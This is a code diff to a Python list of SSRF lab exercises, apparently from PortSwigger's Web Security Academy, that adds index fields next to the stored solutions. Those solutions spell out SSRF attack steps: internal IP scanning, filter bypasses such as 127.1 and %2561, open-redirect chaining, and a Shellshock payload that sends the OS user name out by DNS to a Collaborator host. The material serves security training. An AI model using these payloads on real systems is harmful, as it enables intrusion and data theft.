@@ -1,5 +1,6 @@
 SSRF_LABS = [
     {
+        "index": 0,
         "name": "Basic SSRF against the local server",
         "link": "/web-security/ssrf/lab-basic-ssrf-against-localhost",
         "difficulty": "APPRENTICE",
@@ -8,6 +9,7 @@ SSRF_LABS = [
         "solution": "Change the URL in the stockApi parameter to http://localhost/admin. This should display the administration interface. Read the HTML to identify the URL to delete the target user, which is: http://localhost/admin/delete?username=carlos. Submit this URL in the stockApi parameter, to deliver the SSRF attack."
     },
     {
+        "index": 1,
         "name": "Basic SSRF against another back-end system",
         "link": "/web-security/ssrf/lab-basic-ssrf-against-backend-system",
         "difficulty": "APPRENTICE",
@@ -24,6 +26,7 @@ There exists an admin interface somewhere in the internal IP range. Use it to de
         "solution": "Change the stockApi parameter to http://192.168.0.1:8080/admin then highlight the final octet of the IP address (the number 1 ) and click Add \u00a7 . In the Payloads side panel, change the payload type to Numbers , and enter 1, 255, and 1 in the From and To and Step boxes respectively. Click Start attack . Click on the Status column to sort it by status code ascending. You should see a single entry with a status of 200 , showing an admin interface. Click on this request, send it to Burp Repeater, and change the path in the stockApi to: /admin/delete?username=carlos"
     },
     {
+        "index": 2,
         "name": "Blind SSRF with out-of-band detection",
         "link": "/web-security/ssrf/blind/lab-out-of-band-detection",
         "difficulty": "PRACTITIONER",
@@ -32,6 +35,7 @@ There exists an admin interface somewhere in the internal IP range. Use it to de
         "solution": "Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.  Go to the Repeater tab. Select the Referer header, right-click and select \"Insert Collaborator Payload\" to replace the original domain with a Burp Collaborator generated domain. Send the request.  Go to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.  You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload."
     },
     {
+        "index": 3,
         "name": "SSRF with blacklist-based input filter",
         "link": "/web-security/ssrf/lab-ssrf-with-blacklist-filter",
         "difficulty": "PRACTITIONER",
@@ -40,6 +44,7 @@ There exists an admin interface somewhere in the internal IP range. Use it to de
         "solution": "Visit a product, click \"Check stock\", intercept the request in Burp Suite, and send it to Burp Repeater. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the request is blocked. Bypass the block by changing the URL to: http://127.1/ Change the URL to http://127.1/admin and observe that the URL is blocked again. Obfuscate the \"a\" by double-URL encoding it to %2561 to access the admin interface and delete the target user."
     },
     {
+        "index": 4,
         "name": "SSRF with filter bypass via open redirection vulnerability",
         "link": "/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection",
         "difficulty": "PRACTITIONER",
@@ -48,6 +53,7 @@ There exists an admin interface somewhere in the internal IP range. Use it to de
         "solution": "Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the stockApi parameter on the stock checker: /product/nextProduct?path=http://192.168.0.12:8080/admin Observe that the stock checker follows the redirection and shows you the admin page. Amend the path to delete the target user: /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos"
     },
     {
+        "index": 5,
         "name": "Blind SSRF with Shellshock exploitation",
         "link": "/web-security/ssrf/blind/lab-shellshock-exploitation",
         "difficulty": "EXPERT",
@@ -56,6 +62,7 @@ There exists an admin interface somewhere in the internal IP range. Use it to de
         "solution": "Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:  () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN   Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.  Change the Referer header to http://192.168.0.1:8080 then highlight the final octet of the IP address (the number 1 ), click Add \u00a7 .  In the Payloads side panel, change the payload type to Numbers , and enter 1, 255, and 1 in the From and To and Step boxes respectively.  Click Start attack .  When the attack is finished, go to the Collaborator tab, and click Poll now . If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.  To complete the lab, enter the name of the OS user."
     },
     {
+        "index": 6,
         "name": "SSRF with whitelist-based input filter",
         "link": "/web-security/ssrf/lab-ssrf-with-whitelist-filter",
         "difficulty": "EXPERT",
